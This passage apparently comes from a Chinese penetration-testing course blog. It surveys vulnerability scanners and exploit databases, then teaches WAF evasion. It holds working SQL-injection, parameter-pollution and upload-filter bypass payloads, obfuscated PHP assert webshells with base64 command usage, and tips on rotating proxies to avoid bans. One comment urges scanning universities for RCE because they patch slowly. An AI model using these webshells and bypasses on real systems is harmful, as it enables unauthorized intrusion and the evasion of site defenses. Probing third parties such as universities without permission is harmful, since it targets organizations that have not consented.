自身的功能非常强大，可以更新其漏洞数据库， 以保证最新的漏洞被扫描到。漏洞扫描效率非常高，对于大型复杂网络，可优 先考虑使用；对于大型复杂网络，可以优先考虑使用。可以给出哪些漏洞可以</p>\n<p>被 Metasploit Exploit，哪些漏洞在 Exploit-db 里面有 exploit 的方案。可以生 成非常详细的，非常强大的 Report，涵盖了很多统计功能和漏洞的详细信息。 虽然没有 Web 应用程序扫描，但 Nexpose 涵盖自动漏洞更新以及微软补丁星期 二漏洞更新。</p>\n<ul>\n<li>项目资源：</li>\n</ul>\n<p>Goby：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dvYnlzZWMvR29ieS9yZWxlYXNlcw==\">https://github.com/gobysec/Goby/releases</span><br>\nNuclei：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVp\">https://github.com/projectdiscovery/nuclei</span><br>\nNessus：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvRy03WXU4c2VmSDNCbzNHUnRVbzJFQQ==\">https://mp.weixin.qq.com/s/G-7Yu8sefH3Bo3GRtUo2EA</span><br>\nNexpose：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnVqaWVhY2UuY29tL2hhY2tlci9yYXBpZDctbmV4cG9zZS5odG1s\">https://www.fujieace.com/hacker/rapid7-nexpose.html</span><br>\nFofaMAP：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FzYW90b21vL0ZvZmFNYXA=\">https://github.com/asaotomo/FofaMap</span></p>\n<h4 id=\"nuclei-nessus-nexpose\"><a class=\"markdownIt-Anchor\" href=\"#nuclei-nessus-nexpose\">#</a> nuclei nessus nexpose</h4>\n<p>nessus: 扫描外网的服务器的漏洞比较少，但是扫描内网资产还是可以的，比较推荐用他扫描内网系统漏洞。需要经常去更新漏洞库模版，一般使用高级扫描。</p>\n<p>Nexpose: 需要企业邮箱申请才能得到 key，而后免费使用。扫描系统漏洞比较全面。</p>\n<p>goby: 扫描系统漏洞不是很全面，但是扫服务漏洞是可以的。</p>\n<p><strong>nuclei: 扫描 web 是比较好的，很多人都在添加模板，支持的漏洞比较多，集成了 cnvd 和 cve 等等，比较好用。支持系统漏洞扫描，主要还是探针系统上所搭建的服务的漏洞。</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用方法</span></span><br><span class=\"line\">https://github.com/projectdiscovery/nuclei</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">支持的漏洞</span></span><br><span class=\"line\">https://github.com/projectdiscovery/nuclei-templates</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">扫描某个url地址</span></span><br><span class=\"line\">Nuclei -u http://localhost</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用自定义模板扫描自定义ip清单</span></span><br><span class=\"line\">nuclei.exe -t Zyxel.yaml -l z.txt</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">以yaml中的tag为准进行扫描</span></span><br><span class=\"line\">nuclei.exe -l z.txt -tags rce</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">由于高校打补丁并不及时，可以用nucli进行一波漏洞测试</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"burp-插件整理\"><a class=\"markdownIt-Anchor\" href=\"#burp-插件整理\">#</a> burp 插件整理</h4>\n<ul>\n<li>基本介绍</li>\n</ul>\n<p>app 和小程序抓了包就做漏洞检测的这些插件，在 burp 上安装，可以分别 发现各种框架的漏洞，可以防止数据包需要登录才可以扫描的情况，在发送数 据包的时候就做漏洞发现，但是一般不这么做，而一般比较常用的仍然是从 awvs 这些常用的扫描工具开始。</p>\n<ul>\n<li>项目资源</li>\n</ul>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JpdDR3b28vRmlvcmE=\">https://github.com/bit4woo/Fiora</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21ldGFTdG9yL1NwcmluZ1NjYW4=\">https://github.com/metaStor/SpringScan</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01hc2toZS9GYXN0anNvblNjYW4=\">https://github.com/Maskhe/FastjsonScan</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JpZ3NpemVtZS9Mb2c0ai1jaGVjaw==\">https://github.com/bigsizeme/Log4j-check</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BtaWFvd3UvQnVycFNoaXJvUGFzc2l2ZVNjYW4=\">https://github.com/pmiaowu/BurpShiroPassiveScan</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVpLWJ1cnAtcGx1Z2lu\">https://github.com/projectdiscovery/nuclei-burp-plugin</span></p>\n<h3 id=\"漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h3>\n<h4 id=\"自动收集cve的poc\"><a class=\"markdownIt-Anchor\" href=\"#自动收集cve的poc\">#</a> 自动收集 cve 的 poc</h4>\n<ul>\n<li>PoC-in-GitHub</li>\n</ul>\n<p>项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25vbWktc2VjL1BvQy1pbi1HaXRIdWI=\">https://github.com/nomi-sec/PoC-in-GitHub</span></p>\n<p>可以根据漏洞的 cve 编号进行筛选查看漏洞的 poc，更新较快，需保持同步更新</p>\n<ul>\n<li>exploitdb</li>\n</ul>\n<p>项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0ZGI=\">https://github.com/offensive-security/exploitdb</span></p>\n<p>searchsploit 是集成国外 exploit-db 平台的漏洞库，拥有丰富的漏洞利用内容</p>\n<h4 id=\"监控cnvd和cve漏洞\"><a class=\"markdownIt-Anchor\" href=\"#监控cnvd和cve漏洞\">#</a> 监控 cnvd 和 cve 漏洞</h4>\n<ul>\n<li>cnvd 监控：</li>\n</ul>\n<p>项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3R0b255cy9TY3JhcHktQ1ZFLUNOVkQ=\">https://github.com/ttonys/Scrapy-CVE-CNVD</span><br>\n 特点：不更新了，不是很好</p>\n<ul>\n<li>cve 监控：</li>\n</ul>\n<p>项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ljZHhzYi9Qb2NPckV4cF9pbl9HaXRodWI=\">https://github.com/ycdxsb/PocOrExp_in_Github</span><br>\n 特点：更新比较频繁，会抓取 github 上所有 cve 项目地址</p>\n<h4 id=\"msf漏洞使用说明\"><a class=\"markdownIt-Anchor\" href=\"#msf漏洞使用说明\">#</a> msf 漏洞使用说明</h4>\n<p>漏洞利用数据库:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmFwaWQ3LmNvbS9kYi9tb2R1bGVzL2F1eGlsaWFyeS9hZG1pbi9zbWIvbXMxN18wMTBfY29tbWFuZC8=\">https://www.rapid7.com/db/modules/auxiliary/admin/smb/ms17_010_command/</span></p>\n<p>该模块将利用具有 MS17-010 漏洞的 SMB 来实现 write-what-where 原语。 然后，这将用于以管理员会话覆盖连接会话信息。从那里，正常的 psexec 命 令执行完成。利用 Transaction 和 WriteAndX 请求之间的类型混淆以及 Transaction 请求中的竞争条件，如 EternalRomance、EternalChampion 和 EternalSynergy 漏洞利用中所见。此漏洞利用链比 EternalBlue 漏洞利用更可靠， 但需要命名管道。</p>\n<h4 id=\"viper使用说明\"><a class=\"markdownIt-Anchor\" href=\"#viper使用说明\">#</a> viper 使用说明</h4>\n<ul>\n<li>viper 基本介绍</li>\n</ul>\n<p>Viper (炫彩蛇) 是一款图形化内网渗透工具，将内网渗透过程中常用的战术及 技术进行模块化及武器化；集成杀软绕过，内网隧道，文件管理，命令行等基础功 能；当前已集成 70 + 个模块，覆盖初始访问 / 持久化 / 权限提升 / 防御绕过 / 凭证访问 / 信息收集 / 横向移动等大类；目标是帮助红队工程师提高攻击效率，简化操作，降 低技术门槛；支持在浏览器中运行原生 msfconsole, 且支持多人协作。</p>\n<ul>\n<li>工具使用地址</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">工具地址</span></span><br><span class=\"line\">https://github.com/FunnyWolf/Viper</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装手册</span></span><br><span class=\"line\">https://www.yuque.com/vipersec/help/rggacz</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">一键安装</span></span><br><span class=\"line\">sysctl -w vm.max_map_count=262144</span><br><span class=\"line\">curl -o f8x https://f8x.io/ # wget -O f8x https://f8x.io/</span><br><span class=\"line\">bash f8x -viper</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "渗透测试"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2022/12/30/SAFE/7%20waf%E6%94%BB%E9%98%B2/",
            "url": "http://www.n1h1l157.live/2022/12/30/SAFE/7%20waf%E6%94%BB%E9%98%B2/",
            "title": "XD22 7 Waf 攻防",
            "date_published": "2022-12-29T16:00:00.000Z",
            "content_html": "<h3 id=\"有waf时的信息收集\"><a class=\"markdownIt-Anchor\" href=\"#有waf时的信息收集\">#</a> 有 waf 时的信息收集</h3>\n<h4 id=\"信息收集拦截对抗\"><a class=\"markdownIt-Anchor\" href=\"#信息收集拦截对抗\">#</a> 信息收集拦截对抗</h4>\n<ul>\n<li>信息收集常见检测：</li>\n</ul>\n<p>脚本或工具速度流量快</p>\n<p>脚本或工具的指纹被识别</p>\n<p>脚本或工具的检测 Payload</p>\n<ul>\n<li>信息收集常见方法：</li>\n</ul>\n<p>延迟：解决请求过快封 IP 的情况</p>\n<p>代理池：在确保速度的情况下解决请求过快封 IP 的拦截</p>\n<p>白名单：模拟白名单模拟 WAF 授权测试，解决速度及测试拦截，换大型网站爬虫 UA</p>\n<p>模拟用户：模拟真实用户数据包请求探针，解决 WAF 指纹识别</p>\n<ul>\n<li>被动扫描方式</li>\n</ul>\n<p>黑暗引擎：Fofa Quake Shodan zoomeye 0.zone 等</p>\n<p>其他接口：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3J1bS55d2hhY2suY29tL2JvdW50eXRpcHMucGhwP2dldGluZm8=\">https://forum.ywhack.com/bountytips.php?getinfo</span></p>\n<h4 id=\"信息收集脚本\"><a class=\"markdownIt-Anchor\" href=\"#信息收集脚本\">#</a> 信息收集脚本</h4>\n<ul>\n<li>Python 自定义 header 目录扫描</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">目录扫描</span></span><br><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">headers=&#123;</span><br><span class=\"line\">  &#x27;Connection&#x27;: &#x27;keep-alive&#x27;,</span><br><span class=\"line\">  &#x27;Cache-Control&#x27;: &#x27;max-age=0&#x27;,</span><br><span class=\"line\">  &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;,</span><br><span class=\"line\">  &#x27;User-Agent&#x27;: &#x27;Mozilla/0 (Windows NT 0; Win64; x64) AppleWebKit/536 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/536&#x27;,</span><br><span class=\"line\">  &#x27;Sec-Fetch-Dest&#x27;: &#x27;document&#x27;,</span><br><span class=\"line\">  &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;,</span><br><span class=\"line\">  &#x27;Sec-Fetch-Site&#x27;: &#x27;none&#x27;,</span><br><span class=\"line\">  &#x27;Sec-Fetch-Mode&#x27;: &#x27;navigate&#x27;,</span><br><span class=\"line\">  &#x27;Sec-Fetch-User&#x27;: &#x27;?1&#x27;,</span><br><span class=\"line\">  &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, br&#x27;,</span><br><span class=\"line\">  &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#x27;,</span><br><span class=\"line\">  &#x27;Cookie&#x27;: &#x27;*&#x27;,</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> for paths in open(&#x27;php_b.txt&#x27;,encoding=&#x27;utf-8&#x27;):</span><br><span class=\"line\">   url=&#x27;http://www.testxiaodi.fun/&#x27;</span><br><span class=\"line\">   paths=paths.replace(&#x27;\\n&#x27;,&#x27;&#x27;)</span><br><span class=\"line\">   urls=url+paths</span><br><span class=\"line\">   proxy = &#123;</span><br><span class=\"line\">     &#x27;http&#x27;: &#x27;tps68kdlapi.com:15818&#x27;,</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   try:</span><br><span class=\"line\">     code=requests.get(urls,headers=headers,proxies=proxy).status_code</span><br><span class=\"line\">     print (urls+&#x27;|&#x27;+str(code))</span><br><span class=\"line\">     if code== 200 or code== 403 :</span><br><span class=\"line\">       print (urls+&#x27;|&#x27;+str(code))</span><br><span class=\"line\">   except Exception as err:</span><br><span class=\"line\">     print(&#x27;connecting error&#x27;)</span><br><span class=\"line\">     time.sleep(3)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>使用工具代理流量扫描</li>\n</ul>\n<p>通过快代理买一个临时代理设置，可以在 Awvs/Xray/Goby 等工具上直接使用 代理，或者相关工具需要修改配置文件设置代理，也可以用 proxifier 建立规则， 代理流量至自己购买的代理，将进程的流量进行中转。</p>\n<p>proxifier 需要设置规则的进程，通过软件的属性定位到文件所在的位置， 复制文件的可执行程序，或通过任务管理器来找到当前运行的此软件的进程。</p>\n<h3 id=\"漏洞利用拦截对抗\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用拦截对抗\">#</a> 漏洞利用拦截对抗</h3>\n<h4 id=\"sql注入利用绕过\"><a class=\"markdownIt-Anchor\" href=\"#sql注入利用绕过\">#</a> sql 注入利用绕过</h4>\n<p>参考地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3V0ZS1wdWxpL3AvMTExNDY2aHRtbA==\">https://www.cnblogs.com/cute-puli/p/111466html</span></p>\n<ul>\n<li>关键字替换</li>\n</ul>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xMDA6ODA4MS9zcWxpbGFicy9MZXNzLTIvP2lkPTE=\">http://192.168.0.100:8081/sqlilabs/Less-2/?id=1</span> like 1<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xMDA6ODA4MS9zcWxpbGFicy9MZXNzLTIvP2lkPTE=\">http://192.168.0.100:8081/sqlilabs/Less-2/?id=1</span> like 12</p>\n<ul>\n<li>更换提交方式：</li>\n</ul>\n<p>POST id=-1 union select 1,2,3–+</p>\n<ul>\n<li>模拟文件上传 传递数据</li>\n</ul>\n<p>通过 burp 的右键功能</p>\n<ul>\n<li>分块传输</li>\n</ul>\n<p>更改数据请求格式 ：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2MwbnkxL2NodW5rZWQtY29kaW5nLWNvbnZlcnRlcg==\">https://github.com/c0ny1/chunked-coding-converter</span></p>\n<ul>\n<li>HPP 参数污染</li>\n</ul>\n<p>id=1/&amp;id=-1%20union%20select%201,2,3%23*/</p>\n<h4 id=\"文件上传拦截绕过\"><a class=\"markdownIt-Anchor\" href=\"#文件上传拦截绕过\">#</a> 文件上传拦截绕过</h4>\n<ul>\n<li>符号干扰</li>\n</ul>\n<p>filename=a.php<br>\nfilename=&quot;a.php<br>\n;filename=“a.php”</p>\n<ul>\n<li>%00 干扰</li>\n</ul>\n<p>filename=“a.php%00”</p>\n<ul>\n<li>垃圾数据溢出</li>\n</ul>\n<p>无限 filename;filename=“a.php”<br>\nfilename==“a.php”<br>\nfilename=“name='uploadfile.php”<br>\nfilename=“Content-Disposition: form-data.php”</p>\n<ul>\n<li>换行解析</li>\n</ul>\n<p>filename==“<span class=\"exturl\" data-url=\"aHR0cDovL2EucGg=\">a.ph</span><br>\np”</p>\n<h4 id=\"xss拦截绕过\"><a class=\"markdownIt-Anchor\" href=\"#xss拦截绕过\">#</a> xss 拦截绕过</h4>\n<p>工具链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9YU1N0cmlrZQ==\">https://github.com/s0md3v/XSStrike</span></p>\n<p>使用方法：<br>\n <code>python xsstrike.py -u &quot;http://xx/xss__get.php?message=1&amp; submit=submit&quot; --proxy</code></p>\n<h4 id=\"其他绕过\"><a class=\"markdownIt-Anchor\" href=\"#其他绕过\">#</a> 其他绕过</h4>\n<p>采用参数替换绕过:txt=<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>y</mi><mo>=</mo><mi>s</mi><mi>t</mi><msub><mi>r</mi><mi>r</mi></msub><mi>e</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>e</mi><msup><mo stretchy=\"false\">(</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><msup><mi>x</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><msup><mo separator=\"true\">,</mo><mrow><mo mathvariant=\"normal\">′</mo><mo mathvariant=\"normal\">′</mo></mrow></msup><msup><mo separator=\"true\">,</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>p</mi><mi>x</mi><mi>h</mi><mi>p</mi><mi>x</mi><mi>i</mi><mi>n</mi><mi>x</mi><mi>f</mi><mi>o</mi><mo stretchy=\"false\">(</mo><msup><mo stretchy=\"false\">)</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">)</mo><mo separator=\"true\">;</mo><mi>a</mi><mi>s</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>t</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);assert(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">r</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">e</span><span class=\"mopen\"><span class=\"mopen\">(</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mpunct\"><span class=\"mpunct\">,</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mpunct\"><span class=\"mpunct\">,</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mopen\">(</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mpunct\">;</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">t</span><span class=\"mopen\">(</span></span></span></span>y);&amp;submit=%E6%8F%90%E4%BA%A4</p>\n<p>文件包含使用…\\ …/ …\\ 等</p>\n<h3 id=\"权限控制对抗\"><a class=\"markdownIt-Anchor\" href=\"#权限控制对抗\">#</a> 权限控制对抗</h3>\n<h4 id=\"php-传参带入\"><a class=\"markdownIt-Anchor\" href=\"#php-传参带入\">#</a> php 传参带入</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">php木马如下</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">a=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">aa=<span class=\"variable\">$a</span>.<span class=\"string\">&#x27;ert&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">aa(base64_decode(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;x&#x27;</span>]));</span></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">代码利用</span></span><br><span class=\"line\">?a=ass</span><br><span class=\"line\">x=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>\n<h4 id=\"php-变量覆盖\"><a class=\"markdownIt-Anchor\" href=\"#php-变量覆盖\">#</a> php 变量覆盖</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">php木马如下</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">a=<span class=\"string\">&#x27;b&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">b=<span class=\"string\">&#x27;assert&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\"><span class=\"variable\">$a</span>(base64_decode(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;x&#x27;</span>]));</span></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">代码利用</span></span><br><span class=\"line\">x=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>\n<h4 id=\"php-加密变异\"><a class=\"markdownIt-Anchor\" href=\"#php-加密变异\">#</a> php 加密变异</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5waHBqbS5uZXQv\">http://www.phpjm.net/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwam1zLmNvbS8=\">https://www.phpjms.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE1NzY6MTIzNC8=\">http://1576:1234/</span></p>\n<h4 id=\"php-异或运算\"><a class=\"markdownIt-Anchor\" href=\"#php-异或运算\">#</a> php 异或运算</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span 